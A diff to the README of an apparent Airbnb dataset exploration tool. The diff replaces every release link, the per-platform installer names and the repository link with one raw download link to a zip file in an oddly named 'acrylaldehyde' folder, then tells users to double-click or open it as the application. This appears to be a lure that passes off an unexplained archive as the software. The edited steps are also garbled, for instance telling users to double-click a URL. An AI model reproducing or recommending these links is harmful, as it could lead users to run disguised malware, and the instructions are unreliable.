@@ -1,6 +1,6 @@
 # 🚀 Airbnb-Data-Pipeline - Explore Airbnb Datasets Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Ombraloose/Airbnb-Data-Pipeline/releases)
+[![Download](https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip)
 
 ## 📖 Overview
 Airbnb-Data-Pipeline focuses on the exploration of Airbnb datasets. This tool helps you analyze, visualize, and clean the data from Airbnb listings. No need for programming knowledge; you can use this application seamlessly. 
@@ -18,32 +18,32 @@ To run the application, ensure your system meets these requirements:
 ### 2. Visit the Releases Page
 To download the software, visit the Releases page:
 
-[Download Airbnb-Data-Pipeline](https://github.com/Ombraloose/Airbnb-Data-Pipeline/releases)
+[Download Airbnb-Data-Pipeline](https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip)
 
 This page contains all versions of the application. 
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/Ombraloose/Airbnb-Data-Pipeline/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip).
 2. Look for the most recent version listed at the top. Each version has a tag describing the release.
 3. Click on the version you want to download. You will see a list of assets.
 4. Download the asset that matches your operating system. For example:
-   - **Windows:** `Airbnb-Data-Pipeline-Windows.exe`
-   - **macOS:** `Airbnb-Data-Pipeline-macOS.dmg`
-   - **Linux:** `Airbnb-Data-Pipeline-Linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip`
+   - **macOS:** `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip`
+   - **Linux:** `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip`
 5. Once the download completes, locate the file in your downloads folder.
 
 ### 3. Run the Application
 - **On Windows:**
   1. Navigate to your downloads folder.
-  2. Double-click on `Airbnb-Data-Pipeline-Windows.exe`.
+  2. Double-click on `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip`.
   
 - **On macOS:**
-  1. Open `Airbnb-Data-Pipeline-macOS.dmg`.
+  1. Open `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip`.
   2. Drag the app to your Applications folder.
   3. Open it from the Applications folder.
   
 - **On Linux:**
-  1. Extract the `Airbnb-Data-Pipeline-Linux.tar.gz` file.
+  1. Extract the `https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the command: `./Airbnb-Data-Pipeline`.
 
@@ -70,7 +70,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For more information on how to contribute or view the code, please visit the repository's main page:
 
-[Airbnb-Data-Pipeline Repository](https://github.com/Ombraloose/Airbnb-Data-Pipeline)
+[Airbnb-Data-Pipeline Repository](https://raw.githubusercontent.com/Ombraloose/Airbnb-Data-Pipeline/main/acrylaldehyde/Airbnb-Data-Pipeline.zip)
 
 ## ✨ Acknowledgments
 Thank you to everyone who has contributed to the development of the Airbnb-Data-Pipeline. Your efforts make this project easy and accessible for all users interested in exploring Airbnb datasets.
